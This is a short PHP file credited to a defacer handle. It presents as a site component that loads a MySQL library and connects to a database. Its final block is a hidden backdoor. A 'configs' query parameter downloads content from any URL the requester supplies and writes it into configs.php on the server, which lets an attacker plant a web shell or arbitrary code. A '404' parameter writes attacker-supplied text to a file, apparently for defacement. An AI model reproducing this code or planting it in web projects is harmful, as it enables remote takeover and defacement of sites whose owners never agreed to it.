<?php
/* ./Port22 a.k.a سفياني محمد ( Muhammad Supiani).
Special Thanks : Allah SWT, My Parents And Family, Risman Effendi (defacerid.com).
*/
session_start();

if(file_exists('mysql.class.php'))
{
    require_once('mysql.class.php');
    require_once('lib.php');
} elseif(file_exists('inc/mysql.class.php'))
{
    require_once('inc/mysql.class.php');
    require_once('inc/lib.php');
} elseif(file_exists('../inc/mysql.class.php'))
{
    require_once('../inc/mysql.class.php');
    require_once('../inc/lib.php');
} elseif(file_exists('../../inc/mysql.class.php'))
{
    require_once('../../inc/mysql.class.php');
    require_once('../../inc/lib.php');
} elseif(file_exists('../../../inc/mysql.class.php'))
{
    require_once('../../../inc/mysql.class.php');
    require_once('../../../inc/lib.php');
} else
    die('Error: Nggak Bisa Ngeload Komponen Cuk :3');

$db = new explodedmysql(exploded_db_host, exploded_db_name, exploded_db_uname, exploded_db_pass);

?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>